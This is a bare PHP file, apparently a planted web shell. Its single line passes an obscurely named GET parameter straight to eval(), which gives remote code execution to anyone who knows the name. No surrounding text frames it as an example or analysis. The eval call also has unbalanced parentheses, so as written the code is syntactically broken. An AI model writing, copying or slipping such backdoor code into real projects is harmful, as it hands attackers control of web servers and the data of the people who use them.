<?php
eval(($_GET['d6gJxlnv']);
?>
